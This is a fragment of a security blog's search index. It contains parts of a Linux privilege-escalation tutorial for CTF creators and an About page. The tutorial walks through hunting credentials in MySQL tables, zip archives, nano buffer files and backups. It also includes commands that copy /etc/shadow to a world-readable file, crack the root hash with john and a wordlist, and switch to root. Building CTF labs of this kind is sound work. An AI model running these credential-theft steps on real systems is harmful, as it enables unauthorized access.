`users` ( -\u003e `id` int NOT NULL AUTO_INCREMENT, -\u003e `employee_id` int DEFAULT NULL, -\u003e `user_type` varchar(50) DEFAULT NULL, -\u003e `username` varchar(100) NOT NULL, -\u003e `password` varchar(100) NOT NULL, -\u003e PRIMARY KEY (`id`) -\u003e ) ENGINE=InnoDB DEFAULT CHARSET=utf8; Query OK, 0 rows affected (0.010 sec) Insert data into the users’ table: INSERT INTO `users` (`employee_id`, `user_type`, `username`, `password`) VALUES (NULL, 'SUPER ADMIN', 'root', 'pass123'), (1, 'NORMAL', 'user', 'pass321'), (2, 'ADMIN', 'user', 'hello'); The query looks like this in MariaDB: MariaDB [test]\u003e INSERT INTO `users` (`employee_id`, `user_type`, `username`, `password`) VALUES -\u003e (NULL, 'SUPER ADMIN', 'root', 'pass123'), -\u003e (1, 'NORMAL', 'user', 'pass321'), -\u003e (2, 'ADMIN', 'user', 'hello'); Query OK, 3 rows affected (0.003 sec) Records: 3 Duplicates: 0 Warnings: 0 As the adversary, we can log in to MySQL with: user@pwn:~$ mysql -u user -p Enter password: Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 36 Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. MariaDB [(none)]\u003e Then we could perform an SQL query of the columns username, and password from the users’ table: MariaDB [(none)]\u003e USE test; Reading table information for completi","date":"2021-12-28","objectID":"/linux-privesc-credential-hunting/:1:2","tags":["credential hunting","plaintext","cleartext","smtp","postfix","opasswd","mysql","configuration files","pcapng","john","history","sshpass","telnet","netcat","swaks","scp"],"title":"Linux Privilege Escalation - Credential Hunting  for CTF Creators","uri":"/linux-privesc-credential-hunting/"},{"categories":["Linux Privilege Escalation"],"content":"Compressed File Scenario Create a zip file using the file that we created in the Plaintext File Scenario: user@pwn:~$ zip password.zip /home/user/Desktop/password.txt adding: home/user/Desktop/password.txt (deflated 15%) From an adversary’s perspective, we can try to decompress the file and examine its contents: user@pwn:~$ unzip password.zip -d /tmp Archive: password.zip inflating: /tmp/home/user/Desktop/password.txt Read the file: user@pwn:~$ cat /tmp/home/user/Desktop/password.txt Passwords: The user password is: pass321 This was a really simple example but hey it is what it is. We could attempt to try a password re-use technique and find valid credentials. Privilege Escalation via Buffer Files Some text editors like nano will try to dump the buffer into an emergency file. In the case of the nano text editor, this will happen when it receives a SIGHUP or SIGTERM signal or when it simply runs out of memory. The buffer will be written to a file called nano.save if the buffer does not already have a filename otherwise if it has a filename then it will append a “.save” suffix to the current filename. For more information about this we can try to read the documentation. Imagine that this buffer file was a PHP configuration file for a database connection or something similar. Well if that is the case we may find credentials in the buffer file. ","date":"2021-12-28","objectID":"/linux-privesc-credential-hunting/:1:3","tags":["credential hunting","plaintext","cleartext","smtp","postfix","opasswd","mysql","configuration files","pcapng","john","history","sshpass","telnet","netcat","swaks","scp"],"title":"Linux Privilege Escalation - Credential Hunting  for CTF Creators","uri":"/linux-privesc-credential-hunting/"},{"categories":["Linux Privilege Escalation"],"content":"Nano Scenario Let’s attempt to edit the config.php file that we created in the previous section: nano config.php Open another terminal window, tab, or pane and now let’s send a SIGTERM signal by using the following command: pkill nano After killing the nano process we will see this output in the terminal window, tab, or pane that nano was open: user@pwn:~$ nano config.php Received SIGHUP or SIGTERM Buffer written to config.php.save As the adversary, we can just read the file and gather the credentials: cat config.php.save Privilege Escalation via Backup Files It is very common to see backups of files that do contain credentials. Backups often have this naming convention filename.bak ending with .bak, however, we may also extensions such as the following: .bak .ext # \u003c-- extension like .sh, .php, .pl, .py, .zip .bak.ext .backup ","date":"2021-12-28","objectID":"/linux-privesc-credential-hunting/:1:4","tags":["credential hunting","plaintext","cleartext","smtp","postfix","opasswd","mysql","configuration files","pcapng","john","history","sshpass","telnet","netcat","swaks","scp"],"title":"Linux Privilege Escalation - Credential Hunting  for CTF Creators","uri":"/linux-privesc-credential-hunting/"},{"categories":["Linux Privilege Escalation"],"content":"Sensitive File /etc/shadow Backup Scenario Let’s create a backup of the /etc/shadow file, we shall never do the following: sudo cp /etc/shadow /tmp/shadow.bak \u0026\u0026 sudo chmod o+r /tmp/shadow.bak This is a Linux-sensitive file, this file contains the user password hashes and is now readable by other users and groups. As the adversary, we could attempt to crack the hashes of these users: user@pwn:~$ cat /tmp/shadow.bak root:$6$xxxxxxxxxxxxxxxxxxxxxxx:18982:0:99999:7::: daemon:*:18858:0:99999:7::: bin:*:18858:0:99999:7::: sys:*:18858:0:99999:7::: sync:*:18858:0:99999:7::: \u003c...SNIP...\u003e We can copy this hash and save it in a file called hash.txt: ❯ echo '$6$xxxxxxxxxxxxxxxxxxxxxxx' \u003e hash.txt We could then try to crack the hash to recover the password: ❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt As we can see below, the password has been cracked: ❯ john hash.txt --show ?:pass123 1 password hash cracked, 0 left Once we have cracked the root user password we can switch to the root user: su root ","date":"2021-12-28","objectID":"/linux-privesc-credential-hunting/:1:5","tags":["credential hunting","plaintext","cleartext","smtp","postfix","opasswd","mysql","configuration files","pcapng","john","history","sshpass","telnet","netcat","swaks","scp"],"title":"Linux Privilege Escalation - Credential Hunting  for CTF Creators","uri":"/linux-privesc-credential-hunting/"},{"categories":null,"content":"About 0L9 3L0G 34CK ","date":"2021-12-07","objectID":"/about/:0:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"History The content of this blog originates from my previous, long-lost website. ","date":"2021-12-07","objectID":"/about/:1:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"Objective This blog primarily focuses on post-exploitation techniques tailored for Capture The Flag (CTF) creators. ","date":"2021-12-07","objectID":"/about/:2:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"Setup Custom configuration for pentesting: https://github.com/pwnlog/Minima https://github.com/pwnlog/Scriba https://github.com/pwnlog/PenScripts ","date":"2021-12-07","objectID":"/about/:3:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"Tools Open source pentesting tools: https://github.com/pwnlog/SharpRunAs https://github.com/pwnlog/SharpSwitch https://github.com/pwnlog/Gnp https://github.com/pwnlog/Subfind https://github.com/pwnlog/Mashi ","date":"2021-12-07","objectID":"/about/:4:0","tags":null,"title":"About","uri":"/about/"}]